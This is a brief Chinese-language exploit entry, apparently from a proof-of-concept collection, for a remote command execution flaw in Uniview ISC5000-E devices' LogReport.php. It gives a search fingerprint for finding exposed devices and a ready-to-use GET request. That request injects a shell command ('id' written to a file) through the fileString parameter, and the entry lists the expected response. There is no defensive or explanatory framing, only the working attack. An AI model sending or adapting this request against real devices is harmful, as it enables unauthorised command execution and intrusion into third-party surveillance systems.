# 浙江宇视科技ISCLogReport.php远程命令执行漏洞

浙江宇视科技ISCLogReport.php ｜ 命令执行 ｜ —
- **指纹**：`title=="ISC5000-E"`
- **请求**：`GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bid%3edudesuite.txt HTTP/1.1`
- **响应特征**：200